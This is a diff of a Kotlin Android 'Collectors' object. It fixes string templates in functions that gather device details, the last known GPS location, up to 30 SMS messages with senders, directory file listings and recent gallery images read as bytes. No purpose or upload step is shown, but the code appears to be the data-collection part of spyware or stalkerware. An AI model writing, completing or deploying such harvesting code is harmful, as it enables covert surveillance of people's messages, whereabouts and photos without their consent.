@@ -17,11 +17,11 @@ object Collectors {
     fun deviceInfo(ctx: Context): String {
         val b = StringBuilder()
         b.appendLine("Device")
-        b.appendLine("Model: \${Build.MANUFACTURER} \${Build.MODEL}")
-        b.appendLine("Android: \${Build.VERSION.RELEASE} (SDK \${Build.VERSION.SDK_INT})")
-        b.appendLine("Brand: \${Build.BRAND}")
-        b.appendLine("Device: \${Build.DEVICE}")
-        b.appendLine("Time: \${SimpleDateFormat("dd-MM-yyyy HH:mm:ss", Locale.getDefault()).format(Date())}")
+        b.appendLine("Model: ${Build.MANUFACTURER} ${Build.MODEL}")
+        b.appendLine("Android: ${Build.VERSION.RELEASE} (SDK ${Build.VERSION.SDK_INT})")
+        b.appendLine("Brand: ${Build.BRAND}")
+        b.appendLine("Device: ${Build.DEVICE}")
+        b.appendLine("Time: ${SimpleDateFormat("dd-MM-yyyy HH:mm:ss", Locale.getDefault()).format(Date())}")
         return b.toString()
     }
 
@@ -42,7 +42,7 @@ object Collectors {
             runCatching { lm.getLastKnownLocation(p) }.getOrNull()
         }.maxByOrNull { it.time }
         return if (best == null) "no location (GPS band?)"
-        else "Lat: \${best.latitude}\nLon: \${best.longitude}\nAcc: \${best.accuracy}m\nTime: \${best.time}\nProvider: \${best.provider}"
+        else "Lat: ${best.latitude}\nLon: ${best.longitude}\nAcc: ${best.accuracy}m\nTime: ${best.time}\nProvider: ${best.provider}"
     }
 
     fun sms(ctx: Context, limit: Int = 30): String {
@@ -60,8 +60,8 @@ object Collectors {
                     val body = c.getString(1) ?: ""
                     val ts = c.getLong(2)
                     val t = SimpleDateFormat("dd/MM HH:mm", Locale.getDefault()).format(Date(ts))
-                    sb.appendLine("[\$t] \$addr")
-                    sb.appendLine("  \${body.take(200)}")
+                    sb.appendLine("[$t] $addr")
+                    sb.appendLine("  ${body.take(200)}")
                     sb.appendLine()
                     n++
                 }
@@ -83,11 +83,11 @@ object Collectors {
         val sb = StringBuilder("Files\n")
         for (d in dirs) {
             if (!d.exists() || !d.isDirectory) continue
-            sb.appendLine("\n📁 \${d.name}/")
+            sb.appendLine("\n📁 ${d.name}/")
             runCatching {
                 d.listFiles()?.take(30)?.forEach { f ->
-                    val size = if (f.isDirectory) "dir" else "\${f.length() / 1024} KB"
-                    sb.appendLine("  \${f.name}  (\$size)")
+                    val size = if (f.isDirectory) "dir" else "${f.length() / 1024} KB"
+                    sb.appendLine("  ${f.name}  ($size)")
                 }
             }
         }
@@ -101,13 +101,13 @@ object Collectors {
             val cursor = ctx.contentResolver.query(
                 MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                 projection, null, null,
-                "\${MediaStore.Images.Media.DATE_ADDED} DESC"
+                "${MediaStore.Images.Media.DATE_ADDED} DESC"
             ) ?: return@runCatching
             cursor.use { c ->
                 var n = 0
                 while (c.moveToNext() && n < limit) {
                     val id = c.getLong(0)
-                    val name = c.getString(1) ?: "image_\$n.jpg"
+                    val name = c.getString(1) ?: "image_$n.jpg"
                     val uri = android.content.ContentUris.withAppendedId(
                         MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id)
                     val bytes = runCatching {
